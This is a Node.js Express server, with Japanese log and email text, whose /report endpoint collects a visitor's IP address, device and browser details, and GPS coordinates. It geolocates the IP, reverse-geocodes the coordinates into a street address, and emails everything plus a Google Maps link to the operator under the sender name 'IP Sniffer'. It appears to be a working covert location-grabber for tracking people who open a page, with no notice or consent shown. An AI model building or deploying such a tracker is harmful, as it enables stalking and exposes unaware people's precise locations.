require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const uaParser = require('ua-parser-js');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());
app.use(express.static('public'));

app.post('/report', async (req, res) => {
  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const ua = uaParser(req.headers['user-agent']);
  const { latitude, longitude } = req.body;
  const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

  let geo = {};
  try {
    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
    geo = await geoRes.json();
  } catch (err) {
    console.error('IPジオAPIエラー:', err);
  }

  let addressInfo = '不明';
  try {
    const geoRes = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=${process.env.GOOGLE_API_KEY}`);
    const geoData = await geoRes.json();
    if (geoData.status === 'OK') {
      addressInfo = geoData.results[0]?.formatted_address || '不明';
    }
  } catch (err) {
    console.error('Google逆ジオコーディングエラー:', err);
  }

  // ✉️ Gmailで送信
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: `"IP Sniffer" <${process.env.GMAIL_USER}>`,
    to: process.env.GMAIL_USER,
    subject: '📡 アクセス情報通知',
    text: `
📸 アクセス情報：
- IPアドレス: ${ip}
- IP推定地域: ${geo.country_name || '不明'} / ${geo.region || '不明'} / ${geo.city || '不明'}
- GPS精密住所: ${addressInfo}
- 端末: ${ua.device.type || 'PC'} / ${ua.os.name} / ${ua.browser.name}
- Google Maps: ${locationLink}
- アクセス時間: ${new Date().toLocaleString()}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('✅ Gmail送信成功');
  } catch (error) {
    console.error('❌ Gmail送信失敗:', error);
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`📡 Server running on http://localhost:${PORT}`);
});
